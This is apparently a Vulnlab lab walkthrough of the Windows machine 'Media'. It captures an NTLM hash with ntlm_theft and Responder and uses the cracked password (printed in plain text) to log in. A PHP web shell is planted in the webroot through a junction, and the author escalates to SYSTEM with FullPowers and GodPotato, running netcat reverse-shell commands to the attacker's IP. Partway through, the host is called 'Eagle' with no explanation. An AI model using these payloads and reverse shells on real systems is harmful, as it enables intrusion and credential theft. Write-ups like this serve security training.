
| Machine Name | Difficulty | Date Started | Date Completed |
| ------------ | ---------- | ------------ | -------------- |
| Media        | Medium     | 11/01/2025   | 19/01/2025     |
*Vulnlab.com* 

---

**Learning Points:**
- Using the [**FullPowers**](https://github.com/itm4n/FullPowers/releases/tag/v0.1) tool to automatically recover the default privilege set of a service account, including **`SeAssignPrimaryToken`** and **`SeImpersonate`**.
- Using **symlinks** or **Junctions** to redirect file uploads to the **webroot**, allowing us to execute malicious uploads from the web as the web service account.

---

**Attack Path:**
- Find the upload function in the web application running on port 80.
- Create a malicious audio file using **ntlm_theft** that, when triggered, will send the hash to our SMB server running from **Responder**.
- Upload the audio file, capture the hash, and crack it using **Hashcat**.
- Use the credentials to log in to the machine using **EvilWinRM** and get the user flag.
- Read the source code of the web application and identify the upload path.
- Use **Junctions** to redirect file uploads to the webroot and upload a web shell, then execute it to get a shell as the local service account.
- Use **FullPowers** binary to enable the disabled privileges, such as **SeImpersonatePrivilege**.
- Use **GodPotato** to exploit **SeImpersonatePrivilege**, obtain a system shell, and get the root flag.

---

*Default Nmap scan :*
```
# Nmap 7.94SVN scan initiated Sat Jan 11 22:17:22 2025 as: nmap -sC -sV -oA default -Pn 10.10.124.156
Nmap scan report for 10.10.124.156
Host is up (0.19s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 0b:b3:c0:80:40:88:e1:ae:aa:3b:5f:f4:c2:23:c0:0d (RSA)
|   256 e0:80:3f:dd:b1:f8:fc:83:f5:de:d5:b3:2d:5a:4b:39 (ECDSA)
|_  256 b5:32:c0:72:18:10:0f:24:5d:f8:e1:ce:2a:73:5c:1f (ED25519)
80/tcp   open  http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17)
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17
|_http-title: ProMotion Studio
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-01-11T16:47:49+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=MEDIA
| Not valid before: 2025-01-10T16:39:00
|_Not valid after:  2025-07-12T16:39:00
| rdp-ntlm-info: 
|   Target_Name: MEDIA
|   NetBIOS_Domain_Name: MEDIA
|   NetBIOS_Computer_Name: MEDIA
|   DNS_Domain_Name: MEDIA
|   DNS_Computer_Name: MEDIA
|   Product_Version: 10.0.20348
|_  System_Time: 2025-01-11T16:47:43+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jan 11 22:17:50 2025 -- 1 IP address (1 host up) scanned in 28.08 seconds
```

We accessed a landing page on port 80.

<img src="attachments/dbe788f04aff7b7ee29a6eb104a8e256.png" />

Scrolling down, we found an option to upload files.

<img src="attachments/7bfddf3c3e1346853c456218b162d36b.png" />

We used [**ntlm_theft**](https://github.com/Greenwolf/ntlm_theft) to generate malicious audio files so that, when triggered, the NTLM hash would be sent to our **Responder SMB** server.

```
python3 ntlm_theft.py --generate all --server 10.8.4.157 --filename audio
```

<img src="attachments/411caaae194bd5abe4441b0f9f0661b0.png" />

We uploaded the **audio.wax** file to the web application.

<img src="attachments/6aeef418d1338e3a20468024f7b1b9ff.png" />

After some time, we were able to capture the **NTLMv2 hash** of the **`enox`** user.

<img src="attachments/55023368673dd4717587cf54d98a7f46.png" />

We were able to crack the hash using **Hashcat**.

<img src="attachments/d33dae8eb46ebb90b3d7adbca7de2020.png" />

```
enox:1234virus@
```

Since the SSH port was open, we used the credentials and were able to log in via SSH to obtain the user flag.

<img src="attachments/b7642da4f3d8f35e2992424c4a4da2ff.png" />

### Privilege Escalation

We checked the privileges of our user and were not able to find anything interesting.

<img src="attachments/7c22edf13a7a30fb0cbffdd3c138f6a8.png" />

While enumerating local files, we found the source of the web application in **XAMPP**, but we did not have write access to the folder.

<img src="attachments/82d967b3e86e9b29968de15d2c10293d.png" />

While reviewing the source code of **index.php**, we were able to find the upload function and the path.

<img src="attachments/4825175c5694d6ab8879abcede7b5884.png" />

Upload Directory :

<img src="attachments/cec91b7451e40e3cf9bd05735127126d.png" />

We entered the properties for **email** and **name**, then uploaded a simple web shell to the web application.

```php
<?php
system($_REQUEST['cmd']);
?>
```

<img src="attachments/76cbb6d093a5e812be356efd62b6c9cd.png" />

Inside the **md5hash** renamed directory, we found our shell uploaded.

<img src="attachments/1aca7df6e94267c4957455ddc8141a1c.png" />

We then removed the directory and created a junction so that when the file was uploaded, it would be saved in the webroot instead of the original location.

```
mklink /J C:\Windows\Tasks\Uploads\566537929bb692f41c445544ead8f0e8 C:\xampp\htdocs
```

<img src="attachments/1317670f3aae89b692564fc3197df170.png" />

We uploaded the file with the same properties set as before.

<img src="attachments/3a4abf7f1760eb00c2c4d989c581e6fe.png" />

We were able to confirm that our attack worked, and the **shell.php** file was uploaded to the web root.

<img src="attachments/7e0f3ce0816267777b7a2561de46b8cd.png" />

We could now execute code as **`NT AUTHORITY\LOCAL SERVICE`**.

<img src="attachments/0c17ec72d4cdd85d6af64007e2eb3b64.png" />

We created a directory named **temp** in **C:**, uploaded the **Netcat** binary using **wget** in the SSH PowerShell, and then executed it to obtain a shell. We were able to get a shell as **`NT AUTHORITY\LOCAL SERVICE`** on **Eagle**.

<img src="attachments/b0767e0c3e5db8b2175c0cee6ea8530c.png" />

However, we couldn't see any additional privileges.

<img src="attachments/b460158a9ab9d2ec5074e84f2bdcaa1c.png" />

We used a tool called **`FullPowers`**, which automatically recovered the default privilege set of a service account, including **`SeAssignPrimaryToken`** and **`SeImpersonate`**.

```
FullPowers.exe -c "C:\temp\nc64.exe 10.8.4.157 443 -e cmd" -z
```

<img src="attachments/ebafb6559f13eac3cc786b675669c81a.png" />

After executing it, we obtained a shell with **`SeImpersonatePrivilege`** enabled.

<img src="attachments/5cfb38688bab277824d6d6e82c6aad94.png" />

We executed **Godpotato** and were able to get a shell on **Eagle** as **`NT AUTHORITY\SYSTEM`** and obtained the root flag.

```
GodPotato-NET4.exe -cmd "C:\temp\nc64.exe -e cmd.exe 10.8.4.157 1234"
```

<img src="attachments/2059958deea44ef97209d5219948dc70.png" />

<img src="attachments/e39dca1854a28390cff7209f2e3a5186.png" />

----